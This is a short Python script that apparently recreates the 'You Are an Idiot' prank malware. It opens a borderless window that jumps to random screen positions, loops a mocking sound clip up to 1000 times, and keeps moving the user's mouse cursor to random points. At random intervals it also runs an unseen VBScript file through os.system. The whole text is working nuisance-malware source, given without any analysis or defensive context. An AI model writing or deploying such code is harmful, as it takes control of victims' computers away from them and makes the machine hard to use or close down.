from tkinter import *
import pygame
import time
import random
import os
from pynput.mouse import Controller
from pynput.mouse import Listener

root = Tk()
root.resizable(0,0)
root.overrideredirect(1)

eixY = random.randint(-7,930)
eixX = random.randint(1,390)
root.geometry("{}x{}+{}+{}".format(600, 400, eixY, eixX))

my_mouse = Controller()
x = random.randint(-7,930)
y = random.randint(1,390)
my_mouse.position = (x, y)

pygame.mixer.init()

pygame.mixer.music.load("you-are-an-idiot-idiot.mp3")
pygame.mixer.music.play(loops=1000)

frameCnt = 12
frames = [PhotoImage(file='you-are-an-idiot-idiot.gif',format = 'gif -index %i' %(i)) for i in range(frameCnt)]

def update(ind):

    eixY = random.randint(-7,930)
    eixX = random.randint(1,390)
    root.geometry("{}x{}+{}+{}".format(600, 400, eixY, eixX))
    tem = random.randint(0,10)
    my_mouse = Controller()
    x = random.randint(-7,930)
    y = random.randint(1,390)
    my_mouse.position = (x, y)
    if tem == 5:
        #print(">=5")
        os.system("too.vbs")
        root.after(0, update, 0)
        root.mainloop()
    else:
        #print("<=5")
        frame = frames[ind]
        ind += 1
        if ind == frameCnt:
            ind = 0
        label.configure(image=frame)
        root.after(100, update, ind)
label = Label(root)
label.pack()
root.after(0, update, 0)
root.mainloop()
